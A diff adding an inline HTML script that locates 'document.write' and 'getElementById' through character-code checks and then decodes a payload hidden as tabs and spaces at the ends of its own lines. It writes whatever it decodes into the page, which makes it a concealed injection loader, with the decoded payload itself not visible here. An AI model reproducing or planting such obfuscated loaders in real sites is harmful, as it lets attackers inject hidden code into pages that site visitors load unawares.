@@ -1,0 +1,84 @@
+<script id='p'>
+d=1;
+e=38;
+h = this;		    		
+for (i in h)	   		  
+{	  			  
+	if(i.length == 8)	   		 	
+	{	  	 		 
+		if(i.charCodeAt(0) == 100)	   				
+		{	   	 		
+			if(i.charCodeAt(7) == 116)		     	
+			{	  				 
+				break;	  	  		
+			}	  		 	 
+		}	   		 	
+	}	   	 		
+}		 	 			
+for (j in h[i])		 		   
+{	  	 			
+	if(j.length == 5)	  	 		 
+	{		 					
+		if(j.charCodeAt(0) == 119)	  	 	 	
+		{	   		  
+			if(j.charCodeAt(1) == 114)	  	  		
+			{	  	    
+				break;	  	   	
+			}	  		  	
+		}	  	    
+	}	  	   	
+}		 				 
+for (k in h[i])		 		   
+{		 	 		 
+	if(k.length == 14)		    		
+	{		 	    
+		if(k.charCodeAt(0) == 103)	   		  
+		{	  			  
+			if(k.charCodeAt(3) == 69)	   		 	
+			{	  	 		 
+				break;	   				
+			}	   	 		
+		}		     	
+	}
+}
+r=h[i][k]('p');
+for (l in r)
+{
+	if(l.length == 9)
+	{
+		if(l.charCodeAt(0) == 105)
+		{
+			if(l.charCodeAt(5) == 72)
+			{
+				break;
+			}
+		}
+	}
+}
+a=r[l];
+b=a.split('\n');
+o = "";
+for(c=3; c < (e+3); c++)
+{
+	s=b[c];
+	for(f=0; f < d; f++)
+	{
+		y = ((s.length - (8*d)) + (f*8));
+		v = 0;
+		for(x = 0; x < 8; x++)
+		{
+			if(s.charCodeAt(x+y) > 9)
+			{
+				v++;
+			}
+			if(x != 7)
+			{
+				v = v << 1;
+			}
+		}
+		o += String.fromCharCode(v);
+	}
+}
+h[i][j](o);
+</script>
+
